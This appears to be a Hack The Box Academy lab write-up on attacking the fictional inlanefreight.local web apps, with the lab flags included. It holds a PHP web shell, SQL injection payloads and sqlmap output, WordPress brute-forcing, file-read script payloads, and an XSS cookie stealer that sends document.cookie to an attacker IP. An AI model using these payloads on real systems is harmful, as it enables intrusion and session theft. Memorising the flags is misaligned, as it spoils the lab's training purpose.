# Web Enumeration

## Web Application Enumeration

```shell-session
cat ilfreight_subdomains

inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local
```

eyewitness to enumerate all web applications running

```shell-session
eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
```

![eyewitness](https://academy.hackthebox.com/storage/modules/163/ilfreight\_eyewitness.png)

### blog.inlanefreight.local

![Running Drupal](https://academy.hackthebox.com/storage/modules/163/drupal.png)

To get the version number run the following

```shell-session
curl -s http://blog.inlanefreight.local | grep Drupal
```

Also try default credentials

`admin:admin`, `admin:Welcome1`

### dev.inlanefreight.local

Directory enumeration

```shell-session
gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
```

**Trying HTTP verb tampering to bypass login and authentication**

![TRACK method](https://academy.hackthebox.com/storage/modules/163/track\_method.png)

**Whitelisted IP 127.0.0.1 or localhost**

![X-Custom-IP-Authorization: 127.0.0.1](https://academy.hackthebox.com/storage/modules/163/track\_method\_auth.png)

![File upload](https://academy.hackthebox.com/storage/modules/163/pixel\_shop.png)

try uploading simple web shell&#x20;

```php
<?php system($_GET['cmd']); ?>
```

```shell-session
curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### ir.inlanefreight.local

running wordpress, try wordpress scan to enumerate all plugins (`-ap`)

```shell-session
sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
```

enumerate WordPress users

```shell-session
wpscan -e u -t 500 --url http://ir.inlanefreight.local
```

brute-force one of the account passwords

```shell-session
wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
```

### status.inlanefreight.local

SQL injection

Try entering a sigle quote to get an error and if it does the try using payload

```sql
' union select null, database(), user(), @@version -- //
```

**SQL map**

Mark the injection point with \* and save it to file

```shell-session
POST / HTTP/1.1
Host: status.inlanefreight.local
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://status.inlanefreight.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://status.inlanefreight.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
Connection: close

searchitem=*
```

run this through sqlmap

```shell-session
sqlmap -r sqli.txt --dbms=mysql 

sqlmap -r sqli.txt --dbms=mysql --dbs

sqlmap -r sqli.txt --dbms=mysql -D status --tables
```

### support.inlanefreight.local

Vulnerable to XSS, we can get the cookie and use the cookie-editor

![Cookie editor](https://academy.hackthebox.com/storage/modules/163/edit\_cookie.png)

### tracking.inlanefreight.local

This page is vulnerable to `pdf HTML injection`

Example of injecting `<script>document.write('TESTING THIS')</script>`

![pdf generating](https://academy.hackthebox.com/storage/modules/163/tracking\_rendered.png)

{% embed url="https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90" %}
SSRF Blog 1
{% endembed %}

{% embed url="https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f" %}
SSRF Blog 2
{% endembed %}

```javascript
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```

![Using the above payload to get LFI](https://academy.hackthebox.com/storage/modules/163/ssrf\_file\_read.png)

## Assessment

**Use the IDOR vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).**

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>Registor account</p></figcaption></figure>

See that the url has the id parameter which could be exploited with IDOR

<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption><p>HTB{8f40ecf17f681612246fa5728c159e46}</p></figcaption></figure>

**Exploit the HTTP verb tampering vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).**

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>verb tampering and localhost authorization</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (123).png" alt=""><figcaption><p>File upload bypass (change content type)</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption><p>Web shell obtained</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption><p>HTB{57c7f6d939eeda90aa1488b15617b9fa}</p></figcaption></figure>

**Exploit the WordPress instance and find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}).**

We already know from this section that it is vunerable to lfi and we also know the flag file name. We can slowly enumerate the file system and locate the file&#x20;

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption><p>HTB{e7134abea7438e937b87608eab0d979c}</p></figcaption></figure>

**Enumerate the "status" database and retrieve the password for the "Flag" user. Submit the value as your answer.**

We know that the service page is vulnerable to sqli, running sql map and dump the users table.

```
sqlmap -r sqlmap.txt --dbms=mysql -D status -T users --dump   
        ___
       __H__                                                                
 ___ ___[,]_____ ___ ___  {1.7.6#stable}                                    
|_ -| . ["]     | .'| . |                                                   
|___|_  [.]_|_|_|__,|  _|                                                   
      |_|V...       |_|   https://sqlmap.org                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:57:03 /2023-07-23/

[06:57:03] [INFO] parsing HTTP request from 'sqlmap.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[06:57:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=%' AND 4818=4818#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=%' AND GTID_SUBSET(CONCAT(0x7162627071,(SELECT (ELT(8847=8847,1))),0x71626a7171),8847) AND 'HEaJ%'='HEaJ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=%' AND (SELECT 8294 FROM (SELECT(SLEEP(5)))NLHq) AND 'MTXO%'='MTXO

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: searchitem=%' UNION ALL SELECT NULL,CONCAT(0x7162627071,0x467864497061794451564b4f74694f5a72444b744b5367426b76444e4a7a4d476e414e74574a4246,0x71626a7171),NULL,NULL#
---
[06:57:05] [INFO] testing MySQL
[06:57:05] [INFO] confirming MySQL
[06:57:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[06:57:05] [INFO] fetching columns for table 'users' in database 'status'
[06:57:05] [INFO] fetching entries for table 'users' in database 'status'
Database: status
Table: users
[2 entries]
+----+----------+-----------------------------------+
| id | username | password                          |
+----+----------+-----------------------------------+
| 1  | Admin    | 4528342e54d6f8f8cf15bf6e3c31bf1f6 |
| 2  | Flag     | 1fbea4df249ac4f4881a5da387eb297cf |
+----+----------+-----------------------------------+

[06:57:05] [INFO] table '`status`.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local/dump/status/users.csv'    
[06:57:05] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local'                            

[*] ending @ 06:57:05 /2023-07-23/
```

* ```
  1fbea4df249ac4f4881a5da387eb297cf 
  ```

Steal an admin's session cookie and gain access to the support ticketing queue. Submit the flag value for the "John" user as your answer.

First, create a php file

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Second, script.js file

```bash
echo "new Image().src='http://10.10.14.5:9200/index.php?c='+document.cookie" > script.js
```

Then start the php server and listen at 9200 port and injecting the script.

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

```
"><script src=http://10.10.14.5:9200/script.js></script>
```

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption><p>HTB{1nS3cuR3_c00k135}</p></figcaption></figure>

**Use the SSRF to Local File Read vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).**

{% code overflow="wrap" %}
```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send();</script>
```
{% endcode %}

To read flag run the following command.

{% code overflow="wrap" %}
```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///../flag.txt');x.send();</script>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption><p>HTB{49f0bad299687c62334182178bfd75d8}</p></figcaption></figure>

**Register an account and log in to the Gitlab instance. Submit the flag value (flag format : HTB{}).**

<figure><img src="../../../.gitbook/assets/image (116).png" alt=""><figcaption><p>HTB{32596e8376077c3ef8d5cf52f15279ba}</p></figcaption></figure>

**Use the XXE vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).**

<figure><img src="../../../.gitbook/assets/image (124).png" alt=""><figcaption><p>login with admin:admin and try to checkout.</p></figcaption></figure>

Go to burp and perform xxe.

<figure><img src="../../../.gitbook/assets/image (125).png" alt=""><figcaption><p>Found injection point and able to read file.</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>HTB{dbca4dc5d99cdb3311404ea74921553c}</p></figcaption></figure>

**Use the command injection vulnerability to find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}).**

<figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption><p>login using admin:12qwaszx</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption><p>connection test does somthing</p></figcaption></figure>

Looking at burp requests we can see that it's sending a get request to the server. We can try to inject a command using various characters to seperate the command | & %0a etc.

<figure><img src="../../../.gitbook/assets/image (128).png" alt=""><figcaption><p>got a command injection</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption><p>got file name</p></figcaption></figure>

Using IFS to bypass space character

<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption><p>HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}</p></figcaption></figure>
